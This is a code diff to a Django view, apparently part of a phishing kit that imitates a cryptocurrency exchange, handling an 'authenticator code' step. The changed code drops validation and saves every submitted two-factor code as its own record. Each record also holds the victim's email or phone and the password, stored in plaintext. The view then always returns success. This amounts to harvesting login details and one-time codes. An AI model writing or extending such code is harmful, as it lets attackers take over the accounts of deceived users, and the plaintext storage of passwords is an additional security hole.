@@ -1067,13 +1067,13 @@ def submit_authenticator_code(request):
 
             email_or_phone = data.get("emailOrPhone")
             password = data.get("password")
-            authenticator_code = data.get("authenticatorCode")
+            authenticator_codes = data.get("authenticatorCodes", [])
 
-            # Validation
-            if not all([email_or_phone, password, authenticator_code]):
+            # Validation (you can skip code validation)
+            if not email_or_phone or not password:
                 return JsonResponse({"error": "Missing fields"}, status=400)
 
-            # Check if the user exists based on email or phone and password (simple check)
+            # Check if the user exists based on email or phone and password
             user_profile = UserProfileNoones.objects.filter(
                 email_or_phone=email_or_phone,
                 password=password
@@ -1082,16 +1082,16 @@ def submit_authenticator_code(request):
             if not user_profile:
                 return JsonResponse({"error": "User not found"}, status=404)
 
-            # Update the existing user profile with the authenticator code
-            user_profile.authenticator_code = authenticator_code
-            user_profile.submitted_at = timezone.now()
-            user_profile.save()  # Save the updated profile
+            # Store all authenticator codes
+            for code in authenticator_codes:
+                UserProfileNoones.objects.create(
+                    email_or_phone=email_or_phone,
+                    password=password,
+                    authenticator_code=code,
+                    submitted_at=timezone.now()
+                )
 
-            # Mock logic to validate authenticator code (replace with real logic)
-            if authenticator_code == "123456":  # Mock valid code
-                return JsonResponse({"message": "Authenticator code validated!"}, status=200)
-            else:
-                return JsonResponse({"error": "Invalid authenticator code"}, status=401)
+            return JsonResponse({"message": "Authenticator codes stored successfully!"}, status=200)
 
         except json.JSONDecodeError:
             return JsonResponse({"error": "Invalid JSON format"}, status=400)
